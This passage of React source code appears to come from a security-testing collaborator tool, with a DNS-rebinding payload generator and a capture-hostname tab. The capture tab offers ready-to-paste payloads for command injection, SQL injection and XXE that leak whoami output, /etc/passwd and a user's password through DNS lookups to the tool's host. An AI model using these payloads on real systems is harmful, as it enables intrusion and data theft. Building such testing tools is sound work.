          gap between that check and the actual connect. TTL is forced to 0 so the target
          re-resolves.
        </p>
        <p>
          <span className="font-medium text-foreground/80">Attacker IP</span> = the benign/first
          answer; <span className="font-medium text-foreground/80">Target IP</span> = the
          internal/second answer.
        </p>
        <p>
          Strategies: <span className="font-mono">rd</span> random (default, retry-based, best for
          server-side SSRF), <span className="font-mono">fs</span> first-then-second,{' '}
          <span className="font-mono">ma</span> multiple-A and <span className="font-mono">rr</span>{' '}
          round-robin (browser-oriented). The hostname is HMAC-signed by the server, so it can't be
          forged or abused as an open rebinder.
        </p>
      </HowItWorks>

      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 bg-primary/10 rounded-lg">
              <Globe className="w-5 h-5 text-primary" />
            </div>
            <div>
              <CardTitle>Rebinding Payload Generator</CardTitle>
              <CardDescription>
                Build a signed DNS-rebinding hostname that resolves to an internal target
              </CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="space-y-3">
            <Label>Internal target</Label>
            <div className="grid gap-4 sm:grid-cols-2">
              <div className="space-y-2">
                <Label className="text-xs text-muted-foreground">Known targets</Label>
                <Select value={targetSelect} onValueChange={(v) => { setTargetSelect(v); setCustomIp(''); }}>
                  <SelectTrigger className="w-full">
                    <SelectValue placeholder="Select a known target IP" />
                  </SelectTrigger>
                  <SelectContent>
                    {CATEGORY_ORDER.filter((c) => grouped.has(c)).map((category) => (
                      <SelectGroup key={category}>
                        <SelectLabel>{CATEGORY_LABELS[category]}</SelectLabel>
                        {(grouped.get(category) ?? []).map((t) => (
                          <SelectItem key={t.ip} value={t.ip}>
                            <span className="font-mono">{t.ip}</span>
                            <span className="text-muted-foreground">— {t.label}</span>
                          </SelectItem>
                        ))}
                      </SelectGroup>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label className="text-xs text-muted-foreground">Custom target IP (overrides selection)</Label>
                <Input
                  value={customIp}
                  onChange={(e) => setCustomIp(e.target.value)}
                  placeholder="e.g. 169.254.169.254"
                  className="font-mono text-sm"
                />
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-muted/20 p-4">
            <p className="mb-3 text-[11px] font-medium uppercase tracking-wide text-muted-foreground">
              Rebind flip preview
            </p>
            <div className="flex items-center gap-3">
              <IpPill ip={effectiveAttackerIp} label="benign / first" tone="benign" />
              <div className="flex shrink-0 flex-col items-center text-muted-foreground">
                <ArrowRightLeft className="w-5 h-5" />
                <span className="mt-0.5 font-mono text-[10px] uppercase">{strategy}</span>
              </div>
              <IpPill
                ip={effectiveTarget}
                label={effectiveCategory ? CATEGORY_LABELS[effectiveCategory] : 'internal target'}
                tone="internal"
                icon={CategoryIcon}
              />
            </div>
            <p className="mt-2 text-center text-[11px] text-muted-foreground">
              Same hostname resolves to the benign IP first, then rebinds to the internal target.
            </p>
          </div>

          <div className="space-y-3">
            <Label>Rebinding strategy</Label>
            <div className="space-y-3">
              <div>
                <p className="text-xs font-medium text-muted-foreground mb-1.5">Server-side SSRF</p>
                <div className="grid gap-2 sm:grid-cols-2">
                  {REBIND_STRATEGIES.filter((s) => s.group === 'server').map((s) => (
                    <StrategyOption
                      key={s.value}
                      strategy={s}
                      active={strategy === s.value}
                      onSelect={() => setStrategy(s.value)}
                    />
                  ))}
                </div>
              </div>
              <div>
                <p className="text-xs font-medium text-muted-foreground mb-1.5">Browser rebinding</p>
                <div className="grid gap-2 sm:grid-cols-2">
                  {REBIND_STRATEGIES.filter((s) => s.group === 'browser').map((s) => (
                    <StrategyOption
                      key={s.value}
                      strategy={s}
                      active={strategy === s.value}
                      onSelect={() => setStrategy(s.value)}
                    />
                  ))}
                </div>
              </div>
            </div>
            <p className="text-xs text-muted-foreground">
              <span className="font-mono">ma</span>/<span className="font-mono">rr</span> are
              browser-rebinding techniques; for a server-side SSRF target use{' '}
              <span className="font-mono">rd</span> or <span className="font-mono">fs</span>.
            </p>
          </div>

          <div className="grid gap-4 sm:grid-cols-2">
            <div className="space-y-2">
              <Label>
                Attacker / benign IP{' '}
                <span className="text-muted-foreground font-normal">
                  ({attackerIpDefault ? 'optional' : 'required'})
                </span>
              </Label>
              <Input
                value={attackerIp}
                onChange={(e) => setAttackerIp(e.target.value)}
                placeholder={attackerIpDefault ?? 'e.g. 203.0.113.10'}
                className="font-mono text-sm"
              />
              <p className="text-xs text-muted-foreground">
                The public IP the target resolves to FIRST, before rebinding flips it to the
                internal target — normally this collab server's own public IP. Set DNS Response IP
                (local) or an IP-form VPS URL (remote) in Settings to default it here.
              </p>
            </div>
            <div className="space-y-2">
              <Label>Link program (optional)</Label>
              <Select value={programId} onValueChange={setProgramId}>
                <SelectTrigger className="w-full">
                  <SelectValue placeholder="No program" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="none">
                    <span className="text-muted-foreground">No program</span>
                  </SelectItem>
                  {programs.map((p) => (
                    <SelectItem key={p.id} value={String(p.id)}>
                      {p.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="space-y-2">
            <Label>Note (optional)</Label>
            <Input
              value={note}
              onChange={(e) => setNote(e.target.value)}
              placeholder="What are you testing with this payload?"
            />
          </div>

          <Button
            onClick={() => rebindMutation.mutate()}
            disabled={!effectiveTarget || !effectiveAttackerIp || rebindMutation.isPending}
            className="gap-2"
          >
            {rebindMutation.isPending ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              <RefreshCw className="w-4 h-4" />
            )}
            Generate
          </Button>

          <Alert>
            <AlertCircle className="h-4 w-4" />
            <AlertTitle>Correlation caveat</AlertTitle>
            <AlertDescription className="text-sm">
              A rebinding payload produces a DNS event here, but the victim's HTTP request goes to
              the internal target — so you usually won't see a correlated HTTP hit unless the
              attacker/first IP is this collab server. Use the Capture generator for full DNS→HTTP
              correlation.
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>

      {result && (
        <Card className="border-primary/30">
          <CardHeader>
            <CardTitle>Generated payload</CardTitle>
            <CardDescription>
              Signed hostname for <span className="font-mono">{result.targetIp}</span> using{' '}
              <span className="font-mono">{result.strategy}</span>
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="rounded-lg border bg-primary/5 p-4">
              <div className="mb-2 flex items-center justify-between gap-2">
                <Label className="text-[11px] uppercase tracking-wide text-muted-foreground">
                  Rebinding hostname
                </Label>
                <Button
                  size="sm"
                  className="gap-1.5"
                  aria-label="Copy rebinding hostname"
                  onClick={() => copy(result.hostname, 'rb-host', 'hostname')}
                >
                  {isCopied('rb-host') ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  Copy
                </Button>
              </div>
              <p className="break-all font-mono text-base font-semibold leading-snug">
                {result.hostname}
              </p>
              <p className="mt-2 flex flex-wrap items-center gap-1.5 text-xs text-muted-foreground">
                <span className="font-mono text-emerald-600 dark:text-emerald-400">
                  {result.attackerIp}
                </span>
                <ArrowRight className="w-3 h-3" />
                <span className="font-mono text-rose-600 dark:text-rose-400">{result.targetIp}</span>
              </p>
            </div>

            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <Label className="text-xs text-muted-foreground">Ready-to-paste payloads</Label>
                <Button
                  variant="ghost"
                  size="sm"
                  className="h-6 gap-1 text-xs"
                  onClick={() =>
                    copy(payloads.map((p) => p.value).join('\n'), 'rb-all', 'all payloads')
                  }
                >
                  {isCopied('rb-all') ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                  Copy all
                </Button>
              </div>
              {payloads.map((p) => (
                <PayloadLine
                  key={p.id}
                  label={p.label}
                  value={p.value}
                  id={p.id}
                  copy={copy}
                  isCopied={isCopied}
                />
              ))}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
}

function CaptureTab({
  domain,
  responseIp,
  programs,
}: {
  domain: string | null;
  responseIp: string | null;
  programs: readonly Program[];
}) {
  const { copy, isCopied } = useCopyButton();
  const [programId, setProgramId] = useState('none');
  const [note, setNote] = useState('');
  const [minted, setMinted] = useState<CaptureToken | null>(() => {
    try {
      const raw = localStorage.getItem('dns-capture-token');
      return raw ? (JSON.parse(raw) as CaptureToken) : null;
    } catch {
      return null;
    }
  });

  const mintMutation = useMutation({
    mutationFn: async () => {
      const res = await apiFetch(`${API_URL}/api/interactions/tokens`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...(programId !== 'none' ? { programId: Number(programId) } : {}),
          ...(note.trim() ? { note: note.trim() } : {}),
        }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || 'Failed to mint capture token');
      return json as CaptureToken;
    },
    onSuccess: (data) => {
      setMinted(data);
      localStorage.setItem('dns-capture-token', JSON.stringify(data));
      toast.success('Capture hostname minted');
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const hostname = minted?.hostname ?? null;

  return (
    <div className="space-y-6">
      <HowItWorks>
        <p>
          A capture hostname simply resolves to this collab server and logs the DNS lookup plus any
          follow-up HTTP hit, correlated by a shared token. Use it to{' '}
          <span className="font-medium text-foreground/80">confirm</span> a blind SSRF / OOB: in the
          Live DNS detail you'll see the DNS lookup and then the HTTP request for the same token.
        </p>
        <p>
          Capture confirms; <span className="font-medium text-foreground/80">Rebinding</span>{' '}
          escalates once you've confirmed.
        </p>
      </HowItWorks>

      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 bg-primary/10 rounded-lg">
              <LinkIcon className="w-5 h-5 text-primary" />
            </div>
            <div>
              <CardTitle>Capture Hostname Generator</CardTitle>
              <CardDescription>
                Mint a registered capture token — logged server-side with full DNS→HTTP correlation
              </CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <Label>Capture Hostname</Label>
              <Button
                variant="outline"
                size="sm"
                onClick={() => mintMutation.mutate()}
                disabled={mintMutation.isPending}
                className="gap-2"
              >
                {mintMutation.isPending ? (
                  <Loader2 className="w-3 h-3 animate-spin" />
                ) : (
                  <RefreshCw className="w-3 h-3" />
                )}
                Generate New
              </Button>
            </div>
            <div className="flex gap-2">
              <Input
                value={hostname ?? ''}
                readOnly
                className="font-mono text-sm"
                placeholder="Click 'Generate New' to mint a capture hostname"
              />
              <Button
                variant="outline"
                size="icon"
                aria-label="Copy capture hostname"
                onClick={() => copy(hostname ?? '', 'capture-host', 'hostname')}
                disabled={!hostname}
              >
                {isCopied('capture-host') ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              </Button>
            </div>
            <p className="text-xs text-muted-foreground">
              A DNS lookup or HTTP hit on this hostname is captured and correlated in the Live DNS feed.
            </p>
          </div>

          <div className="grid gap-4 sm:grid-cols-2">
            <div className="space-y-2">
              <Label>Link program (optional)</Label>
              <Select value={programId} onValueChange={setProgramId}>
                <SelectTrigger className="w-full">
                  <SelectValue placeholder="No program" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="none">
                    <span className="text-muted-foreground">No program</span>
                  </SelectItem>
                  {programs.map((p) => (
                    <SelectItem key={p.id} value={String(p.id)}>
                      {p.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <Label>Note (optional)</Label>
              <Input
                value={note}
                onChange={(e) => setNote(e.target.value)}
                placeholder="What are you testing?"
              />
            </div>
          </div>

          <div className="grid gap-3 sm:grid-cols-2">
            <div className="space-y-2">
              <Label className="text-xs text-muted-foreground">Base domain</Label>
              <div className="flex gap-2">
                <Input value={domain ?? ''} readOnly className="font-mono text-sm" />
                <Button
                  variant="outline"
                  size="icon"
                  aria-label="Copy base domain"
                  onClick={() => copy(domain ?? '', 'base-domain', 'base domain')}
                >
                  {isCopied('base-domain') ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                </Button>
              </div>
            </div>
            {responseIp && (
              <div className="space-y-2">
                <Label className="text-xs text-muted-foreground">DNS response IP</Label>
                <Input value={responseIp} readOnly className="font-mono text-sm" />
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      {hostname && (
        <Card>
          <CardHeader>
            <div className="flex items-center gap-3">
              <div className="p-2 bg-primary/10 rounded-lg">
                <Code className="w-5 h-5 text-primary" />
              </div>
              <div>
                <CardTitle>Payload Examples</CardTitle>
                <CardDescription>Copy these examples and modify for your testing</CardDescription>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <Tabs defaultValue="ssrf">
              <TabsList className="grid grid-cols-2 sm:grid-cols-4 w-full">
                <TabsTrigger value="ssrf" className="gap-2">
                  <LinkIcon className="w-3 h-3" />
                  SSRF
                </TabsTrigger>
                <TabsTrigger value="cmd" className="gap-2">
                  <Terminal className="w-3 h-3" />
                  Command
                </TabsTrigger>
                <TabsTrigger value="sql" className="gap-2">
                  <Database className="w-3 h-3" />
                  SQL
                </TabsTrigger>
                <TabsTrigger value="xxe" className="gap-2">
                  <FileCode className="w-3 h-3" />
                  XXE
                </TabsTrigger>
              </TabsList>

              <TabsContent value="ssrf" className="space-y-2">
                <PayloadLine
                  label="Simple SSRF Test"
                  value={`http://${hostname}`}
                  id="c-ssrf-1"
                  copy={copy}
                  isCopied={isCopied}
                />
                <PayloadLine
                  label="SSRF with URL Parameter"
                  value={`http://target.com/api?url=http://${hostname}`}
                  id="c-ssrf-2"
                  copy={copy}
                  isCopied={isCopied}
                />
              </TabsContent>

              <TabsContent value="cmd" className="space-y-2">
                <PayloadLine
                  label="Extract Current User"
                  value={`; nslookup $(whoami).${hostname}`}
                  id="c-cmd-1"
                  copy={copy}
                  isCopied={isCopied}
                />
                <PayloadLine
                  label="Extract Hostname"
                  value={`; nslookup $(hostname).${hostname}`}
                  id="c-cmd-2"
                  copy={copy}
                  isCopied={isCopied}
                />
                <PayloadLine
                  label="Extract File Contents (Base64)"
                  value={`; nslookup $(cat /etc/passwd | base64 | head -c 60).${hostname}`}
                  id="c-cmd-3"
                  copy={copy}
                  isCopied={isCopied}
                />
              </TabsContent>

              <TabsContent value="sql" className="space-y-2">
                <PayloadLine
                  label="MySQL LOAD_FILE Exfiltration"
                  value={`' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.${hostname}\\\\\\\\abc')))--`}
                  id="c-sql-1"
                  copy={copy}
                  isCopied={isCopied}
                />
                <PayloadLine
                  label="MSSQL xp_dirtree"
                  value={`'; EXEC master..xp_dirtree '\\\\\\\\${hostname}\\\\share'--`}
                  id="c-sql-2"
                  copy={copy}
                  isCopied={isCopied}
                />
              </TabsContent>

              <TabsContent value="xxe" className="space-y-2">
                <PayloadLine
                  label="Basic XXE Out-of-Band"
                  value={`<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://${hostname}/xxe">\n]>\n<foo>&xxe;</foo>`}
                  id="c-xxe-1"
                  copy={copy}
                  isCopied={isCopied}
                />
                <PayloadLine
                  label="XXE with External DTD"
                  value={`<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM "file:///etc/passwd">\n  <!ENTITY % dtd SYSTEM "http://${hostname}/evil.dtd">\n  %dtd;\n]>\n<foo>&send;</foo>`}
                  id="c-xxe-2"
                  copy={copy}
                  isCopied={isCopied}
                />
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      )}

      <Alert>
        <AlertCircle className="h-4 w-4" />
        <AlertTitle>How it works</AlertTitle>
        <AlertDescription className="text-sm space-y-2">
          <p>
            When you use these payloads in a vulnerable application, the target server makes a DNS
            query to your hostname — logged in the Live DNS feed, confirming the vulnerability even
            when you can't see the HTTP response.
          </p>
          <p className="text-muted-foreground">
            For data-exfiltration payloads, the extracted data is encoded in the subdomain and
            captured in your DNS logs.
          </p>
        </AlertDescription>
      </Alert>
    </div>
  );
}
